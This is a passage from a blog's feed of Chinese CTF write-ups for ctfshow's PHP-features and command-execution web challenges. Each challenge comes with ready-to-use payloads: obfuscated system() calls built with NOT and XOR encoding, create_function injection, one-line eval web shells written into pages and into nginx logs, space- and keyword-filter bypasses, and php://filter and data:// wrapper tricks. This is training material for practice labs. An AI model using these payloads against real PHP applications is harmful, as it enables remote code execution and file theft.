1-phpinfo();是可以执行phpinfo()命令的。<br>这样就好说了。构造出1-phpinfo()-1就可以了，也就是说 v1=1&amp;v2=1&amp;v3=-phpinfo()-。</p><p>运行脚本构造system(‘tac f*’)得到 <code>(~%8c%86%8c%8b%9a%92)(~%8b%9e%9c%df%99%d5)</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：v1=1&amp;v3=-(~%8c%86%8c%8b%9a%92)(~%8b%9e%9c%df%99%d5)-&amp;v2=1</span><br></pre></td></tr></table></figure><h2 id="web142"><a href="#web142" class="headerlink" title="web142"></a>web142</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041753532.png" alt="image-20220302210048715"></p><p>0和0x0绕过 这里绕过因为是因为当成了8进制和16进制</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：v1=0</span><br></pre></td></tr></table></figure><h2 id="web143"><a href="#web143" class="headerlink" title="web143"></a>web143</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041754143.png" alt="image-20220302210319210"></p><p>过滤了加减我们还可以用乘除，过滤了~我们可以用异或构造命令</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload：</span><br><span class="line">v1=<span class="number">1</span>&amp;v3=*(<span class="string">&quot;%0c%06%0c%0b%05%0d&quot;</span>^<span class="string">&quot;%7f%7f%7f%7f%60%60&quot;</span>)(<span class="string">&quot;%0b%01%03%00%06%00&quot;</span>^<span class="string">&quot;%7f%60%60%20%60%2a&quot;</span>)*&amp;v2=<span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="web144"><a href="#web144" class="headerlink" title="web144"></a>web144</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041755224.png" alt="image-20220302212139253"></p><p>相比web141增加了对str的长度限制，但是完全没影响</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：v1=<span class="number">1</span>&amp;v3=-&amp;v2=(~%<span class="number">8</span>c%<span class="number">86</span>%<span class="number">8</span>c%<span class="number">8</span>b%<span class="number">9</span>a%<span class="number">92</span>)(~%<span class="number">8</span>b%<span class="number">9</span>e%<span class="number">9</span>c%df%<span class="number">99</span>%d5)</span><br></pre></td></tr></table></figure><h2 id="web145"><a href="#web145" class="headerlink" title="web145"></a>web145</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041755431.png" alt="image-20220302212139253"></p><p>三元运算符</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;return 1?phpinfo():1;&quot;</span>);</span><br></pre></td></tr></table></figure><p>可以执行命令，构造payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：v1=<span class="number">1</span>&amp;v3=?(~%<span class="number">8</span>c%<span class="number">86</span>%<span class="number">8</span>c%<span class="number">8</span>b%<span class="number">9</span>a%<span class="number">92</span>)(~%<span class="number">8</span>b%<span class="number">9</span>e%<span class="number">9</span>c%df%<span class="number">99</span>%d5):&amp;v2=<span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="web146"><a href="#web146" class="headerlink" title="web146"></a>web146</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041755085.png" alt="image-20220302213827488"></p><p>多增加了分号的过滤，不能用三目运算符，使用等号和位运算符</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;return 1==phpinfo()||1;&quot;</span>);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: v1=<span class="number">1</span>&amp;v3===(~%<span class="number">8</span>c%<span class="number">86</span>%<span class="number">8</span>c%<span class="number">8</span>b%<span class="number">9</span>a%<span class="number">92</span>)(~%<span class="number">8</span>b%<span class="number">9</span>e%<span class="number">9</span>c%df%<span class="number">99</span>%d5)||&amp;v2=<span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="web147"><a href="#web147" class="headerlink" title="web147"></a>web147</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041756474.png" alt="image-20220303172712538"></p><table><thead><tr><th>\D</th><th>匹配一个非数字字符。等价于[^0-9]。grep要加上-P，perl正则支持</th></tr></thead><tbody><tr><td>\s</td><td>匹配任何不可见字符，包括空格、制表符、换页符等等。</td></tr></tbody></table><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">create_function(<span class="string">&#x27;$a&#x27;</span>,<span class="string">&#x27;echo $a.&quot;123&quot;&#x27;</span>) </span><br><span class="line">类似于 </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"><span class="variable">$a</span></span>) </span>&#123;  </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>.<span class="string">&quot;123&quot;</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>hint:在PHP的命名空间默认为\，所有的函数和类都在\这个命名空间中，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径；而如果写\function_name() 这样调用函数，则其实是写了一个绝对路径。如果你在其他namespace里调用系统类，就必须写绝对路径这种写法。</p><p>这段话告诉我怎么调用函数，creat_function第一个参数是参数，第二个参数是内容</p><p>我们通过闭合}来执行后面的命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">%5ccreate_function(&#x27;$a&#x27;,&#x27;return 111;&#125;system(&#x27;tac f*&#x27;);//&#x27;)</span><br><span class="line">function a($a)&#123;</span><br><span class="line">    return 111;&#125;system(&#x27;tac f*&#x27;);//</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload: </span><br><span class="line"><span class="keyword">GET</span> ?show=echo <span class="number">111</span>;&#125;;<span class="keyword">system</span>(<span class="comment">&#x27;tac f*&#x27;);//</span></span><br><span class="line">POST ctf=%<span class="number">5</span>ccreate_function</span><br></pre></td></tr></table></figure><h2 id="web148"><a href="#web148" class="headerlink" title="web148"></a>web148</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041756505.png" alt="image-20220303175202944"></p><p>看到payload的我一脸懵，使用中文异或</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：code=$哈=&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;;$&#123;$哈&#125;[哼]($&#123;$哈&#125;[嗯]);&amp;哼=system&amp;嗯=tac f*</span><br></pre></td></tr></table></figure><p>这个我不会，但是^没有过滤，我可以直接异或构造</p><h2 id="web149"><a href="#web149" class="headerlink" title="web149"></a>web149</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041756051.png" alt="image-20220303184731286"></p><p>scandir() 函数返回指定目录中的文件和目录的数组。</p><p>写入一句话。进行命令执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload：</span><br><span class="line">ctf=index.php</span><br><span class="line">show=&lt;?php eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure><h2 id="web150"><a href="#web150" class="headerlink" title="web150"></a>web150</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTFSHOW</span></span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$username</span>;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$vip</span>;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$secret</span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;vip = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;secret = <span class="variable">$flag</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;secret;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isVIP</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;vip?<span class="literal">TRUE</span>:<span class="literal">FALSE</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__autoload</span>(<span class="params"><span class="variable">$class</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$class</span>))&#123;</span><br><span class="line">      <span class="variable">$class</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">\<span class="comment">#过滤字符</span></span><br><span class="line"><span class="variable">$key</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\_| |\[|\]|\?/&#x27;</span>, <span class="variable">$key</span>))&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ctf</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line">extract(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="keyword">if</span>(class_exists(<span class="variable">$__CTFSHOW__</span>))&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;class is exists!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$isVIP</span> &amp;&amp; strrpos(<span class="variable">$ctf</span>, <span class="string">&quot;:&quot;</span>)===<span class="literal">FALSE</span>)&#123;</span><br><span class="line">  <span class="keyword">include</span>(<span class="variable">$ctf</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>日志文件包含写一句话<br>修改user_agent内容为一句话，然后包含/var/log/nginx/access.log就可以使用我们写的一句话了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">首先访问index.php 修改user_agent为&lt;?php eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">isVIP=<span class="number">1</span></span><br><span class="line"><span class="number">1</span>=<span class="keyword">system</span>(<span class="string">&quot;tac f*&quot;</span>);&amp;ctf=/var/<span class="keyword">log</span>/nginx/access.<span class="keyword">log</span></span><br></pre></td></tr></table></figure><h2 id="web151"><a href="#web151" class="headerlink" title="web151"></a>web151</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTFSHOW</span></span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$username</span>;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$vip</span>;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$secret</span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;vip = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;secret = <span class="variable">$flag</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;secret;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isVIP</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;vip?<span class="literal">TRUE</span>:<span class="literal">FALSE</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__autoload</span>(<span class="params"><span class="variable">$class</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$class</span>))&#123;</span><br><span class="line">      <span class="variable">$class</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">\<span class="comment">#过滤字符</span></span><br><span class="line"><span class="variable">$key</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\_| |\[|\]|\?/&#x27;</span>, <span class="variable">$key</span>))&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ctf</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line">extract(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="keyword">if</span>(class_exists(<span class="variable">$__CTFSHOW__</span>))&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;class is exists!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$isVIP</span> &amp;&amp; strrpos(<span class="variable">$ctf</span>, <span class="string">&quot;:&quot;</span>)===<span class="literal">FALSE</span> &amp;&amp; strrpos(<span class="variable">$ctf</span>,<span class="string">&quot;log&quot;</span>)===<span class="literal">FALSE</span>)&#123;</span><br><span class="line">  <span class="keyword">include</span>(<span class="variable">$ctf</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不能日志包含了，log木有了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hint：这个题一点点小坑__autoload()函数不是类里面的 __autoload — 尝试加载未定义的类 最后构造?..CTFSHOW..=phpinfo就可以看到phpinfo信息啦 原因是..CTFSHOW..解析变量成__CTFSHOW__然后进行了变量覆盖，因为CTFSHOW是类就会使用 __autoload()函数方法，去加载，因为等于phpinfo就会去加载phpinfo 接下来就去getshell啦</span><br></pre></td></tr></table></figure><p>hint写的很好</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：?..CTFSHOW..=phpinfo</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;ctfshow-PHP特性&quot;&gt;&lt;a href=&quot;#ctfshow-PHP特性&quot; class=&quot;headerlink&quot; title=&quot;ctfshow.PHP特性&quot;&gt;&lt;/a&gt;ctfshow.PHP特性&lt;/h1&gt;&lt;h2 id=&quot;web89&quot;&gt;&lt;a href=&quot;#web89&quot; class=&quot;headerlink&quot; title=&quot;web89&quot;&gt;&lt;/a&gt;web89&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://gitee.com/yun421/picgo/raw/master/img/202203041726118.png&quot; alt=&quot;chrome_Jb5AopKoUw&quot;&gt;&lt;/p&gt;
&lt;p&gt;数组绕过正则表达式&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;返回值&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;返回完整匹配次数（可能是&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;），或者如果发生错误返回&lt;span class=&quot;literal&quot;&gt;FALSE&lt;/span&gt;。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;也就是说如果我们不按规定传一个字符串，而是数组的话，就会返回false，从而不会进入if&lt;/p&gt;
&lt;p&gt;payload:num[]=1&lt;/p&gt;</summary>
    
    
    
    <category term="WEB" scheme="http://yun421.top/categories/WEB/"/>
    
    
  </entry>
  
  <entry>
    <title>ctfshow.命令执行</title>
    <link href="http://yun421.top/2021/11/19/ctfshow-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <id>http://yun421.top/2021/11/19/ctfshow-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</id>
    <published>2021-11-19T04:54:41.000Z</published>
    <updated>2022-03-04T09:37:39.666Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ctfshow-命令执行"><a href="#ctfshow-命令执行" class="headerlink" title="ctfshow.命令执行"></a>ctfshow.命令执行</h1><h3 id="类型一-web29-36"><a href="#类型一-web29-36" class="headerlink" title="类型一:web29-36"></a>类型一:web29-36</h3><p>变量c来接受并过滤传入的数据,eval函数来执行 </p><h3 id="类型二-web37-41"><a href="#类型二-web37-41" class="headerlink" title="类型二:web37-41"></a>类型二:web37-41</h3><p>变量c接收并过滤传入的数据,include来包含文件</p><h3 id="类型三-web42-57"><a href="#类型三-web42-57" class="headerlink" title="类型三:web42-57"></a>类型三:web42-57</h3><p>接受并过滤传入的变量拼接命令执行（system函数）</p><h3 id="类型四-web58-77"><a href="#类型四-web58-77" class="headerlink" title="类型四:web58-77"></a>类型四:web58-77</h3><p>PHP代码执行，突破禁用函数,绕过disable_functions</p><span id="more"></span><h2 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041737909.png" alt="chrome_YQfHFrvnwg"></p><p>题目只过滤了flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：c=system(&#x27;cat f*&#x27;);</span><br></pre></td></tr></table></figure><p>在linux系统中 有一些通配符</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">\*匹配任何字符串／文本，包括空字符串；*代表任意字符（<span class="number">0</span>个或多个） ls file *</span><br><span class="line">?匹配任何一个字符（不在括号内时）?代表任意<span class="number">1</span>个字符 ls file <span class="number">0</span></span><br><span class="line">[abcd]匹配abcd中任何一个字符</span><br><span class="line">[a-z]表示范围a到z，表示范围的意思 []匹配中括号中任意一个字符 ls file <span class="number">0</span></span><br></pre></td></tr></table></figure><h2 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041737910.png" alt="chrome_wcuwIJzADQ"></p><p>比上一题多过滤了<code>|system|php|</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：c=echo `cat f*`;</span><br></pre></td></tr></table></figure><p>命令执行函数：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">system() </span><br><span class="line">passthru() </span><br><span class="line"><span class="built_in">exec</span>() </span><br><span class="line">shell_exec() </span><br><span class="line">popen() </span><br><span class="line">proc_open() </span><br><span class="line">pcntl_exec() </span><br><span class="line">反引号 同shell_exec() </span><br></pre></td></tr></table></figure><p>system函数是有回显的，其他的函数可以通过echo等显示</p><h2 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041737911.png" alt="chrome_NmuQjvEa2j"></p><p>这个题比上个题多过滤了<code>|cat|sort|shell|\.| |\&#39;|</code>这些，主要进行空格过滤和cat过滤绕过。</p><p>在linux 空格可以用以下字符串代替： </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt; &lt; &lt;&gt; 重定向符 </span><br><span class="line">%09(需要php环境) </span><br><span class="line"><span class="variable">$&#123;IFS&#125;</span> </span><br><span class="line">$IFS<span class="variable">$9</span> </span><br><span class="line">&#123;cat,flag.php&#125; //用逗号实现了空格功能 </span><br><span class="line">%20 </span><br><span class="line">%09</span><br></pre></td></tr></table></figure><p>在linux中与cat有类似功能的有如下字符：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">more:一页一页的显示档案内容</span><br><span class="line">less:与 more 类似</span><br><span class="line">head:查看头几行</span><br><span class="line">tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示</span><br><span class="line">tail:查看尾几行</span><br><span class="line">nl：显示的时候，顺便输出行号</span><br><span class="line">od:以二进制的方式读取档案内容</span><br><span class="line">vi:一种编辑器，这个也可以查看</span><br><span class="line">vim:一种编辑器，这个也可以查看</span><br><span class="line">sort:可以查看</span><br><span class="line">uniq:可以查看</span><br><span class="line">file -f:报错出具体内容</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：c=echo%09`tac%09fl*`;</span><br></pre></td></tr></table></figure><h2 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041737912.png" alt="chrome_TI4kEjFbHb"></p><p>比上一题多过滤了<code>|\`|echo|\;|</code>，分号可以用<code>?&gt;</code>绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload：c=include&quot;$_POST[1]&quot;?&gt;    </span><br><span class="line">post：1=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><h2 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041737913.png" alt="chrome_140mQ45lhA"></p><p>比上一题多过滤了<code>|”|</code>,但是不影响操作,去掉也可以正常拿到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload：c=include$_POST[1]?&gt;     </span><br><span class="line">post：1=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><h2 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041737914.png" alt="chrome_MVQwMyKJPJ"></p><p>比上一题多过滤了<code>|:|</code>,同理并不影响操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload：c=include$_POST[1]?&gt;     </span><br><span class="line">post：1=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><h2 id="web35"><a href="#web35" class="headerlink" title="web35"></a>web35</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041737915.png" alt="chrome_cxgUR6nmcT"></p><p>比上一题多过滤了<code>|\&lt;|\=|</code>，同理并不影响操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：c=include$_POST[1]?&gt;     post：1=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><h2 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041737916.png" alt="chrome_dPy9iQJBHE"></p><p>比上一题多过滤了<code>|/|[0-9]|</code>,把post传的数字改为字母即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload：c=include$_POST[a]?&gt;     </span><br><span class="line">post：a=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><h2 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041737917.png" alt="chrome_DqhhYdOvf5"></p><p>题目源码出现了PHP文件包含函数include()，利用伪协议读flag</p><p><code>data://</code>，可以让用户来控制输入流，当它与包含函数结合时，用户输入的<code>data://</code>流会被当作php文件执行</p><p>过滤了flag,flag.php 可以用通配符绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：c=data://text/plain,&lt;?php system(&quot;cat f*&quot;);</span><br></pre></td></tr></table></figure><h2 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041737918.png" alt="chrome_HOO2MZLVqF"></p><p>比上一题多过滤了<code>|php|file|</code>,把php用base64编码一下绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：c=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZioiKTs=</span><br></pre></td></tr></table></figure><h2 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041737919.png" 